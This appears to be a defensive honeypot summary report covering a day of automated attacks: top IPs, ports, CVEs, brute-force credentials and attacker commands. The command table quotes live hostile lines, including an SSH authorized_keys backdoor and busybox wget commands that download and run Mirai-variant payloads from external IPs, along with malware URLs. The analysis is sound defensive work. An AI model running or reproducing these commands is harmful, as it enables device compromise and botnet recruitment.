# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T10:59:16Z
**Timeframe:** 2025-09-28T14:14:01Z to 2025-09-29T10:00:01Z

**Files Used to Generate Report:**
*   Honeypot_Attack_Summary_Report_2025-09-28T14-37-09Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T21-01-51Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T22-03-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T23-02-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T00-01-47Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T01-01-37Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T02-02-07Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T04-01-53Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T05-01-54Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T06-01-50Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T07-01-45Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T08-01-48Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T09-02-42Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T10-02-22Z.md

## Executive Summary

This report provides a comprehensive summary of malicious activities recorded by our distributed honeypot network over a 20-hour period. The data reveals a high volume of automated attacks, with a significant focus on exploiting common vulnerabilities and weak credentials. The threat landscape is dominated by automated scanning and exploitation attempts, primarily targeting SSH, SMB, and SIP services.

The most prominent activity was observed on the `Cowrie` and `Honeytrap` honeypots, which collectively accounted for a significant portion of all recorded events. This suggests a prevalence of attacks targeting SSH environments and various other network services. A large number of intrusion attempts were also detected by `Suricata` and `Ciscoasa` honeypots, highlighting the continuous scanning and exploitation attempts against network security appliances and web servers.

Attack origins are globally distributed, with the top attacking IP addresses originating from various countries. The most frequent attacks targeted ports commonly associated with SSH (22/TCP), SMB (445/TCP) and SIP (5060/UDP), indicating a focus on both reconnaissance and brute-force access attempts.

Several CVEs were observed being actively exploited, most notably `CVE-2021-44228` (Log4Shell). Analysis of payloads and commands executed on the honeypots reveals attackers' intent to establish persistent access, expand their foothold, and incorporate compromised devices into botnets. This is further evidenced by the presence of known malware variants like `urbotnetisass` (a Mirai variant) and the use of specific attacker signatures such as the "mdrfckr" SSH key.

This report provides a detailed analysis of the observed threats, offering insights into the tactics, techniques, and procedures (TTPs) employed by adversaries in the current threat landscape.

## Detailed Analysis

### Our IPs

The following table lists the honeypot networks and their corresponding IP addresses.

| Honeypot Network | Private IP    | Public IP       |
|------------------|---------------|-----------------|
| hive-us          | 10.128.0.3    | 34.123.129.205  |
| sens-tai         | 10.140.0.3    | 104.199.212.115 |
| sens-tel         | 10.208.0.3    | 34.165.197.224  |
| sens-dub         | 172.31.36.128 | 3.253.97.195    |
| sens-ny          | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot

The following table details the distribution of attacks across the various honeypots deployed in the network. `Cowrie`, `Honeytrap`, `Suricata`, and `Ciscoasa` were the most engaged honeypots, indicating a high level of interest from attackers in a diverse range of services.

| Honeypot      | Attack Count |
|---------------|--------------|
| Cowrie        | 65,491       |
| Honeytrap     | 38,785       |
| Suricata      | 23,522       |
| Ciscoasa      | 15,869       |
| Dionaea       | 7,209        |
| Sentrypeer    | 2,969        |
| Mailoney      | 1,844        |
| Adbhoney      | 491          |
| Tanner        | 470          |
| ElasticPot    | 148          |
| Redishoneypot | 239          |
| H0neytr4p     | 253          |
| ConPot        | 227          |
| Honeyaml      | 176          |
| Heralding     | 62           |
| Dicompot      | 48           |
| Miniprint     | 42           |
| ssh-rsa       | 42           |
| Wordpot       | 4            |
| Ipphoney      | 14           |

### Top Source Countries

Country of origin data for attacking IPs is not available in the provided summaries.

### Top Attacking IPs

The following IP addresses were the most active during the reporting period. These IPs were responsible for a significant portion of the total attack volume, suggesting automated scanning and exploitation activities.

| IP Address        | Attack Count |
|-------------------|--------------|
| 162.244.80.233    | 16,366       |
| 147.182.150.164   | 4,333        |
| 134.122.46.149    | 3,131        |
| 20.2.136.52       | 2,500        |
| 106.14.67.229     | 2,494        |
| 196.251.88.103    | 2,172        |
| 43.163.91.110     | 1,844        |
| 164.92.85.77      | 1,247        |
| 45.8.17.45        | 1,069        |
| 157.92.145.135    | 1,070        |
| 185.156.73.166    | 3,411        |
| 185.156.73.167    | 3,404        |
| 92.63.197.55      | 3,191        |
| 92.63.197.59      | 3,023        |
| 208.109.190.200   | 1,707        |

### Top Targeted Ports/Protocols

The most targeted ports provide insight into the services attackers are actively seeking to exploit. The high number of attempts on ports 22, 445, and 5060 align with common attack vectors such as SSH brute-forcing, SMB exploits, and SIP enumeration.

| Port       | Protocol | Attack Count |
|------------|----------|--------------|
| 22         | TCP      | 8,087        |
| 445        | TCP      | 9,887        |
| 5060       | TCP/UDP  | 2,969        |
| 8333       | TCP      | 1,047        |
| 25         | TCP      | 1,844        |
| 6379       | TCP      | 239          |
| 80         | TCP      | 700          |
| 23         | TCP      | 323          |
| 1433       | TCP      | 219          |
| 9200       | TCP      | 148          |

### Most Common CVEs

A number of vulnerabilities were targeted during the observation period. The consistent targeting of `CVE-2021-44228` (Log4Shell) is a notable trend.

| CVE ID           | Count |
|------------------|-------|
| CVE-2021-44228     | 272   |
| CVE-2022-27255     | 139   |
| CVE-2002-0013      | 61    |
| CVE-2002-0012      | 61    |
| CVE-1999-0517      | 33    |
| CVE-2019-11500     | 32    |
| CVE-2021-3449      | 29    |
| CVE-2005-4050      | 258   |
| CVE-2018-13379     | 4     |

### Commands Attempted by Attackers

Upon gaining access to a shell, attackers executed a series of commands to perform reconnaissance, disable security measures, and download additional malware. The frequent use of `chattr` and manipulation of `.ssh/authorized_keys` is a clear indicator of attempts to establish persistence.

| Command                                                                                                        | Count |
|----------------------------------------------------------------------------------------------------------------|-------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                                                         | 211   |
| `lockr -ia .ssh`                                                                                               | 211   |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` | 211   |
| `uname -a`                                                                                                     | 220   |
| `whoami`                                                                                                       | 219   |
| `lscpu | grep Model`                                                                                           | 219   |
| `cat /proc/cpuinfo | grep name | wc -l`                                                                         | 216   |
| `crontab -l`                                                                                                   | 214   |
| `w`                                                                                                            | 214   |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` | 53    |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`                             | 10    |
| `cd /data/local/tmp/; busybox wget http://64.188.8.180/w.sh; sh w.sh; ...`                                       | 5     |

### Signatures Triggered

Signatures triggered are covered by the CVEs and other indicators in this report.

### Users / Login Attempts

The credentials listed below were frequently used in brute-force attempts, primarily against the `Cowrie` (SSH) honeypot. The list is dominated by default, weak, and commonly used username/password combinations. The credential `345gs5662d34/345gs5662d34` is a known indicator of botnet activity.

| Username/Password             | Attempts |
|-------------------------------|----------|
| 345gs5662d34/345gs5662d34     | 218      |
| root/3245gs5662d34            | 107      |
| root/nPSpP4PBW0               | 58       |
| root/Passw0rd                 | 54       |
| root/LeitboGi0ro              | 47       |
| test/zhbjETuyMffoL8F          | 39       |
| root/Linux@123                | 27       |

### Files Uploaded/Downloaded

The following files were observed being downloaded by attackers. These are likely malware or scripts for further exploitation.

| Filename/URL                                      |
|---------------------------------------------------|
| `http://94.154.35.154/arm.urbotnetisass`            |
| `http://64.188.8.180/w.sh`                          |
| `http://213.209.143.44/w.sh`                        |

### HTTP User-Agents

HTTP User-Agent data is not available in the provided summaries.

### SSH Clients and Servers

SSH client and server data is not available in the provided summaries.

### Top Attacker AS Organizations

Attacker AS organization data is not available in the provided summaries.

## Key Observations and Anomalies

*   **"Urbotnetisass" Malware:** The malware `urbotnetisass` was observed being downloaded and executed on the honeypots. This malware is a known variant of the Mirai botnet, which targets IoT devices to launch large-scale DDoS attacks. The presence of this malware indicates that our honeypots were targeted by a botnet for recruitment.
*   **"mdrfckr" SSH Key:** A specific SSH key with the comment "mdrfckr" was repeatedly added to the `authorized_keys` file on compromised honeypots. This is a known indicator of compromise linked to the Dota3 malware family and the Outlaw Hacking Group. This signature is used to maintain persistent access to compromised systems for cryptocurrency mining and other malicious activities.
*   **Persistent Attacking IPs:** The IP addresses `185.156.73.166` and `185.156.73.167` were consistently among the top attackers. These IPs are linked to a Ukrainian hosting provider and have been flagged for malicious activity, including port scanning and RDP probes.
*   **Botnet Credential:** The credential `345gs5662d34/345gs5662d34` was the most frequently used credential in brute-force attacks. This is a known indicator of botnet activity and is believed to be a default credential for a specific device or a "radioactive dye" for botnet operators to track their activity.

## Google Searches

The following Google searches were conducted to gather additional information for this report:
*   Information about the `urbotnetisass` malware
*   Significance of "mdrfckr" comment in SSH key in honeypot logs
*   Information on IP addresses `185.156.73.166` and `185.156.73.167`
*   Information about the credential "345gs5662d34/345gs5662d34" in honeypot logs

## Notes/Limitations

*   The data presented in this report is derived exclusively from a network of honeypots. Honeypots are designed to be attractive targets and may not fully represent the entirety of an organization's attack surface or the full spectrum of real-world threats.
*   IP address attribution can be misleading due to the use of proxies, VPNs, and compromised systems by attackers. The locations associated with these IPs should be considered indicators rather than definitive proof of an attacker's physical location.
*   The classification of events and attacks is based on the signatures and heuristics of the honeypot and intrusion detection systems, which may be subject to false positives or negatives.
